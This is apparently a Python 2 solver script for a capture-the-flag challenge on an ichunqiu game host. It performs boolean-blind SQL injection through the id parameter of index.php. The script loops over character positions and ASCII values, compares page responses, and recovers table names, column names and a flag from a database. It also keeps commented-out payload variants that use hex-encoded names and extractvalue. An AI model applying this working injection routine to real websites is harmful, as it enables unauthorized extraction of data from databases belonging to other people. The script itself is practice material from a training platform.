# coding:utf-8
import urllib
import urllib2

URL="http://43fb85f060774589915a7d9a785c060772bd8684a03f4136.game.ichunqiu.com/index.php?id=-1"
text="http://43fb85f060774589915a7d9a785c060772bd8684a03f4136.game.ichunqiu.com/index.php?id=-1+or%20(select%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema%20like%200x696e666f726d6174696f6e5f736368656d61%20limit%200,1),1,1)))>32"
ContentType='application/x-www-form-urlencoded' 
host = '43fb85f060774589915a7d9a785c060772bd8684a03f4136.game.ichunqiu.com'
useragent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36'

opener = urllib2.build_opener()
opener.addheaders = [('User-Agent',useragent)]
opener.addheaders.append(('Host',host))
opener.addheaders.append(('Content-Type',ContentType))
table=''
# CHARACTER_SETS
# COLLATIONS 
for j in range(1,20):
	for i in range(32,127):
		# payload="+or (select ascii(substr((select table_name from information_schema.tables where table_schema like 0x696e666f726d6174696f6e5f736368656d61 limit 1,1),%d,1)))>%d"%(j, i)
		# url=URL+payload
		# url=url.replace(' ','%20')
		# url="http://43fb85f060774589915a7d9a785c060772bd8684a03f4136.game.ichunqiu.com/index.php?id=-1+or+ascii((select+concat_ws(char(32),column_name)+from+information_schema.columns+where+table_name+like+extractvalue(0x3c613e663134673c2f613e,0x2f61)+or+table_schema+like+extractvalue(0x3c613e776f7264733c2f613e,0x2f61)+limit %d,1))>%d"%(j,i)
		url="http://43fb85f060774589915a7d9a785c060772bd8684a03f4136.game.ichunqiu.com/index.php?id=-1+or+ascii(substring((select+*+from+words.f14g+limit+0,1),%d,1))>%d"%(j,i)
		url=url.replace(' ','%20')
		# print url
		res = opener.open(text,timeout=10).read()
		copy = opener.open(url,timeout=10).read()
		# print res
		# print copy
		if res != copy:
			# print i
			table+=chr(i)
			break
	print table